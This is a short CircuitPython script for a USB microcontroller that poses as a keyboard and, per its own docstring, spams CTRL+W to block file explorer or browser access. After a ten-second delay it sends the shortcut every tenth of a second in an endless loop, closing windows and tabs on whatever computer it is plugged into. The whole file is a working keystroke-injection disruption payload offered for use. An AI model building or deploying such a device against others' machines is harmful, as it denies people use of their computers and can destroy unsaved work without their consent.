'''
This code.py is intended to spam the CTRL+W keys preventing file explorer or browser access.
'''
import time
import usb_hid
import os
import board 
import digitalio

from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
led = digitalio.DigitalInOut(board.GP25)
led.direction = digitalio.Direction.OUTPUT
led.value = False

# 10-second delay
time.sleep(10)

while True:
	led.value = True
	keyboard.send(Keycode.CONTROL, Keycode.W)
	time.sleep(.1)

